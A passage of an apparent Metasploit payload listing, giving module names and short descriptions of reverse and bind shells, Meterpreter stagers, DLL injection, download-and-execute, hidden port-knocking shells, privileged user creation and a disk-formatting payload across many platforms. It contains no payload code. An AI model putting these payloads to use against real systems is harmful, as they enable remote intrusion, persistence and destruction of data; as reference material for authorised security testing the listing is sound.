    linux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    linux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    linux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/exec                                      Execute an arbitrary command
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x64/shell_find_port                           Spawn a shell on an established connection
    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection
    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)
    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection
    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6
    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker
    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service
    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service
    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)
    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection
    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)
    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)
    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection
    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6
    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x86/shell_find_port                           Spawn a shell on an established connection
    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
    linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    mainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
    multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
    multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
    netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
    nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
    nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
    osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
    osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
    osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
    osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.
    osx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
    osx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection
    osx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
    osx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    osx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute
    osx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute
    osx/x64/exec                                        Execute an arbitrary command
    osx/x64/meterpreter/bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute
    osx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute
    osx/x64/meterpreter_reverse_http                    Run the Meterpreter / Mettle server payload (stageless)
    osx/x64/meterpreter_reverse_https                   Run the Meterpreter / Mettle server payload (stageless)
    osx/x64/meterpreter_reverse_tcp                     Run the Meterpreter / Mettle server payload (stageless)
    osx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech
    osx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
    osx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
    osx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute
    osx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute
    osx/x86/exec                                        Execute an arbitrary command
    osx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute
    osx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute
    osx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
    osx/x86/shell_find_port                             Spawn a shell on an established connection
    osx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    osx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute
    osx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute
    osx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell
    osx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell
    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)
    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6
    php/bind_php                                        Listen for a connection and spawn a command shell via php
    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)
    php/download_exec                                   Download an EXE from an HTTP URL and execute it
    php/exec                                            Execute a single system command
    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection
    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6
    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support
    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support
    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)
    php/reverse_perl                                    Creates an interactive shell via perl
    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions
    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.
    python/meterpreter/bind_tcp                         Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection
    python/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection with UUID Support
    python/meterpreter/reverse_http                     Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP
    python/meterpreter/reverse_https                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP using SSL
    python/meterpreter/reverse_tcp                      Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker
    python/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Reverse Python connect back stager using SSL
    python/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker with UUID Support
    python/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell
    python/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell
    python/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell
    python/shell_bind_tcp                               Creates an interactive shell via python, encodes with base64 by design
    python/shell_reverse_tcp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3
    python/shell_reverse_tcp_ssl                        Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    python/shell_reverse_udp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3
    r/shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R
    r/shell_reverse_tcp                                 Connect back and create a command shell via R
    ruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby
    ruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby
    ruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby
    ruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL
    solaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell
    solaris/sparc/shell_find_port                       Spawn a shell on an established connection
    solaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
    solaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell
    solaris/x86/shell_find_port                         Spawn a shell on an established connection
    solaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    tty/unix/interact                                   Interacts with a TTY on an established socket connection
    windows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
    windows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
    windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
    windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
    windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
    windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
    windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
    windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
    windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
    windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
    windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
    windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
    windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
    windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
    windows/dllinject/reverse_udp                       Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
    windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
    windows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload
    windows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
    windows/meterpreter/bind_hidden_ipknock_tcp         Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/meterpreter/bind_hidden_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/meterpreter/bind_ipv6_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection (Windows x86)
    windows/meterpreter/bind_ipv6_tcp_uuid              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/meterpreter/bind_named_pipe                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a pipe connection (Windows x86)
    windows/meterpreter/bind_nonx_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (No NX)
    windows/meterpreter/bind_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (Windows x86)
    windows/meterpreter/bind_tcp_rc4                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection
    windows/meterpreter/bind_tcp_uuid                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection with UUID Support (Windows x86)
    windows/meterpreter/find_tag                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Use an established connection
    windows/meterpreter/reverse_hop_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.
    windows/meterpreter/reverse_http                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows wininet)
    windows/meterpreter/reverse_http_proxy_pstore       Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP
    windows/meterpreter/reverse_https                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows wininet)
    windows/meterpreter/reverse_https_proxy             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP using SSL with custom proxy support
    windows/meterpreter/reverse_ipv6_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker over IPv6
    windows/meterpreter/reverse_named_pipe              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker via a named pipe pivot
    windows/meterpreter/reverse_nonx_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker (No NX)
    windows/meterpreter/reverse_ord_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_allports            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/meterpreter/reverse_tcp_dns                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4_dns             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker
    windows/meterpreter/reverse_tcp_uuid                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker with UUID Support
    windows/meterpreter/reverse_udp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker with UUID Support
    windows/meterpreter/reverse_winhttp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows winhttp)
    windows/meterpreter/reverse_winhttps                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows winhttp)
    windows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell
    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell
    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell
    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell
    windows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
    windows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
    windows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)
    windows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/patchupdllinject/bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)
    windows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)
    windows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)
    windows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection
    windows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)
    windows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection
    windows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6
    windows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)
    windows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker
    windows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support
    windows/patchupdllinject/reverse_udp                Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support
    windows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)
    windows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/patchupmeterpreter/bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)
    windows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)
    windows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)
    windows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection
    windows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)
    windows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection
    windows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6
    windows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)
    windows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support
    windows/patchupmeterpreter/reverse_udp              Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support
    windows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session
    windows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session
    windows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)
    windows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/shell/bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)
    windows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)
    windows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)
    windows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection
    windows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)
    windows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection
    windows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6
    windows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)
    windows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_bind_tcp                              Listen for a connection and spawn a command shell
    windows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell
    windows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not coming from the IP defined in AHOST. This way the port will appear as "closed" helping us to hide the shellcode.
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    windows/speak_pwned                                 Causes the target to say "You Got Pwned" via the Windows Speech API
    windows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode
    windows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.
    windows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)
    windows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)
    windows/upexec/bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)
    windows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)
    windows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)
    windows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection
    windows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)
    windows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection
    windows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6
